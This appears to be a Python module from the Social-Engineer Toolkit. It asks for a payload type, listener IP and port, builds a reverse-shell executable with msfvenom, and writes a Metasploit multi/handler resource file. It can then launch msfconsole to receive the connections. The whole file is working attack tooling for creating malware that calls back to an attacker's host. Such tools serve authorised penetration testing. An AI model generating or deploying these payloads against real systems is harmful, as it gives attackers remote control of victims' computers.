#!/usr/bin/env python
import subprocess
from src.core.setcore import *
from src.core.menu.text import *
from src.core.dictionaries import *

# definepath
definepath = os.getcwd()
sys.path.append(definepath)
# grab the metasploit path
meta_path = meta_path()

# here we handle our main payload generation


def payload_generate(payload, lhost, port):
    # generate metasploit
    subprocess.Popen(meta_path + "msfvenom -p %s LHOST=%s LPORT=%s --format=exe > %s/payload.exe" %
                     (payload, lhost, port, userconfigpath), stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True).wait()
    # write out the rc file
    filewrite = open(userconfigpath + "meta_config", "w")
    filewrite.write(
        "use multi/handler\nset payload %s\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nexploit -j\r\n\r\n" % (payload, lhost, port))
    filewrite.close()
    print_status(
        "Payload has been exported to the default SET directory located under: " + userconfigpath + "payload.exe")

show_payload_menu2 = create_menu(payload_menu_2_text, payload_menu_2)
payload = (raw_input(setprompt(["4"], "")))
# if its default then select meterpreter
if payload == "":
    payload = "2"
# assign the right payload
payload = ms_payload(payload)
lhost = raw_input(
    setprompt(["4"], "IP address for the payload listener (LHOST)"))
port = raw_input(setprompt(["4"], "Enter the PORT for the reverse listener"))
# print to user that payload is being generated
print_status("Generating the payload.. please be patient.")
# generate the actual payload
payload_generate(payload, lhost, port)

# check options to see if we are using the infectious media generator
if check_options("INFECTION_MEDIA=") != "ON":
    # start the payload for the user
    payload_query = raw_input(setprompt(
        ["4"], "Do you want to start the payload and listener now? (yes/no)"))
    if payload_query.lower() == "y" or payload_query.lower() == "yes":
        print_status(
            "Launching msfconsole, this could take a few to load. Be patient...")
        subprocess.Popen(meta_path + "msfconsole -r " +
                         userconfigpath + "meta_config", shell=True).wait()
